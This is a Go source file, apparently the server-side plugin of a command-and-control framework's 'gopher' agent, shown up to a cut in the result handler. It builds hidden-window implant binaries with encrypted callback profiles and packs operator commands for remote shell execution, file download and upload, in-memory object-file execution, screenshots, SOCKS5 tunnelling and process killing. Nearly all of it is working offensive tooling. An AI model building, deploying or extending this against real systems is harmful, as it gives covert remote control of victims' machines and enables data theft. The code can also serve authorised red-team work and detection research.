package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	/// START CODE HERE
	/// END CODE HERE
	return makeProxyTask(data)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	/// START CODE HERE
	/// END CODE HERE
	return makeProxyTask(data)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	/// END CODE HERE
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os               string `json:"os"`
	Arch             string `json:"arch"`
	Format           string `json:"format"`
	Win7support      bool   `json:"win7_support"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
}

var SrcPath = "src_gopher"

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		/// START CODE HERE

		var (
			generateConfig GenerateConfig
			profileData    []byte
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		encrypt_key, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}

		reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "tcp":

			tcp_banner, _ := listenerMap["tcp_banner"].(string)

			servers, _ := listenerMap["callback_addresses"].(string)

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			addresses := strings.Split(servers, ",")

			var sslKey []byte
			var sslCert []byte
			var caCert []byte
			Ssl, _ := listenerMap["ssl"].(bool)
			if Ssl {
				ssl_key, _ := listenerMap["client_key"].(string)
				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
				if err != nil {
					return nil, err
				}

				ssl_cert, _ := listenerMap["client_cert"].(string)
				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
				if err != nil {
					return nil, err
				}

				ca_cert, _ := listenerMap["ca_cert"].(string)
				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
				if err != nil {
					return nil, err
				}
			}

			profile := Profile{
				Type:        uint(agentWatermark),
				Addresses:   addresses,
				BannerSize:  len(tcp_banner),
				ConnTimeout: reconnectTimeout,
				ConnCount:   generateConfig.ReconnectCount,
				UseSSL:      Ssl,
				SslCert:     sslCert,
				SslKey:      sslKey,
				CaCert:      caCert,
			}
			profileData, _ = msgpack.Marshal(profile)

		default:
			return nil, errors.New("protocol unknown")
		}

		extHandler := ExtenderAgent{}
		profileData, _ = extHandler.Encrypt(profileData, encryptKey)
		profileData = append(encryptKey, profileData...)

		profileString := ""
		for _, b := range profileData {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))

		fmt.Println(profileString)

		/// END CODE HERE
	}
	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	var (
		generateConfig GenerateConfig
		GoArch         string
		GoOs           string
		buildPath      string
	)

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	if generateConfig.Arch == "arm64" {
		GoArch = "arm64"
	} else if generateConfig.Arch == "amd64" {
		GoArch = "amd64"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown architecture")
	}

	LdFlags := "-s -w"
	if generateConfig.Os == "linux" {
		Filename = "agent.bin"
		GoOs = "linux"
	} else if generateConfig.Os == "macos" {
		Filename = "agent.bin"
		GoOs = "darwin"
	} else if generateConfig.Os == "windows" {
		Filename = "agent.exe"
		GoOs = "windows"
		LdFlags += " -H=windowsgui"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("operating system not supported")
	}
	buildPath = tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s/%s, Output: %s", GoOs, GoArch, Filename))

	config := "package main\n\nvar encProfiles = [][]byte{"
	for _, profile := range agentProfiles {
		config += fmt.Sprintf("    []byte(\"%s\")\n", profile)
	}
	config += "}\n"

	configPath := currentDir + "/" + SrcPath + "/config.go"
	err = os.WriteFile(configPath, []byte(config), 0644)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
	if generateConfig.Os == "windows" && generateConfig.Win7support {
		_, err := os.Stat("/usr/lib/go-win7/go")
		if os.IsNotExist(err) {
			return nil, "", errors.New("go-win7 not installed")
		}
		cmdBuild = fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s GOROOT=/usr/lib/go-win7/ /usr/lib/go-win7/go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Using go-win7 for Windows 7 support")

	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")

	var buildArgs []string
	buildArgs = append(buildArgs, "-c", cmdBuild)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir+"/"+SrcPath, "sh", buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	Payload, err = os.ReadFile(buildPath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	/// END CODE HERE

	return Payload, Filename, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(beat, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.ACP = int(sessionInfo.Acp)
	agentData.OemCP = int(sessionInfo.Oem)
	agentData.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agentData.Tid = ""
	agentData.Arch = "x64"
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr

	if sessionInfo.Os == "linux" {
		agentData.Os = adaptix.OS_LINUX
		agentData.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "windows" {
		agentData.Os = adaptix.OS_WINDOWS
		agentData.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "darwin" {
		agentData.Os = adaptix.OS_MAC
		agentData.OsDesc = sessionInfo.OSVersion
	} else {
		agentData.Os = adaptix.OS_UNKNOWN
		return agentData, nil, errors.New("unknown OS")
	}

	agentData.SessionKey = sessionInfo.EncryptKey
	agentData.Domain = ""
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process

	/// END CODE

	return agentData, &ExtenderAgent{}, nil
}

/// AGENT HANDLER

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {

	/// START CODE

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	/// END CODE

	return ciphertext, nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {

	/// START CODE

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	/// END CODE

	return plaintext, nil
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {

	var packData []byte

	/// START CODE HERE

	var objects [][]byte
	var command Command

	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	/// END CODE

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	/// START CODE HERE

	err = errors.New("Function Pivot not packed")

	/// END CODE

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var cmd Command

	switch command {

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "execute":
		if agentData.Os != adaptix.OS_WINDOWS {
			goto RET
		}

		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			r := make([]byte, 4)
			_, _ = rand.Read(r)
			taskId := binary.BigEndian.Uint32(r)

			taskData.TaskId = fmt.Sprintf("%08x", taskId)

			bofFile, err := getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, decodeErr := base64.StdEncoding.DecodeString(bofFile)
			if decodeErr != nil {
				err = decodeErr
				goto RET
			}

			paramData, ok := args["param_data"].(string)
			if !ok {
				paramData = ""
			}

			packerData, _ := msgpack.Marshal(ParamsExecBof{Object: bofContent, ArgsPack: paramData, Task: taskData.TaskId})
			cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "directory")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		cmd = Command{Code: COMMAND_PS, Data: nil}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rev2self":
		cmd = Command{Code: COMMAND_REV2SELF, Data: nil}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_JOB

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := msgpack.Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}

		if agentData.Os == adaptix.OS_WINDOWS {
			cmdArgs := []string{"/c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "C:\\Windows\\System32\\cmd.exe", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		} else {
			cmdArgs := []string{"-c", cmdParam}
			packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		}

	case "screenshot":
		cmd = Command{Code: COMMAND_SCREENSHOT, Data: nil}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":
		remote_path, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remote_path)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "zip":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		zip_path, err := getStringArg(args, "zip_path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsZip{Src: path, Dst: zip_path})
		cmd = Command{Code: COMMAND_ZIP, Data: packerData}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

	/// END CODE

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	/// START CODE

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_EXEC_BOF:

				var params AnsExecBof
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var msgs []BofMsg
				err = msgpack.Unmarshal(params.Msgs, &msgs)
				if err != nil {
					continue
				}

				task.Message = "BOF output"

				for _, msg := range msgs {
					if msg.Type == CALLBACK_AX_SCREENSHOT {

						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						note := make([]byte, length)
						if _, err := buf.Read(note); err != nil {
							continue
						}
						screen := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(screen); err != nil {
							continue
						}

						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)

					} else if msg.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						filename := make([]byte, length)
						if _, err := buf.Read(filename); err != nil {
							continue
						}
						data := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(data); err != nil {
							continue
						}
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())
						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)

					} else if msg.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "BOF error"
						task.ClearText += Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
					} else {
						task.ClearText += Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
					}
				}

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

